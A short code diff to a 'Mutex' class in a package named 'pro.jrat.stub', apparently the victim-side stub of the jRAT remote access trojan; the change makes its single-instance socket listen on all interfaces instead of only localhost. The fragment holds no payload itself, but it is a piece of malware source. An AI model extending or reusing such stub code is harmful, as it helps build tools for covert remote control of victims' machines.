@@ -1,5 +1,5 @@
 package pro.jrat.stub;
-import java.net.InetAddress;
+
 import java.net.ServerSocket;
 
 public class Mutex extends Thread {
@@ -13,7 +13,7 @@ public class Mutex extends Thread {
 
 	public void run() {
 		try {
-			socket = new ServerSocket(port, 0, InetAddress.getByAddress(new byte[] { 127, 0, 0, 1 }));
+			socket = new ServerSocket(port);
 		} catch (Exception ex) {
 			System.exit(0);
 		}
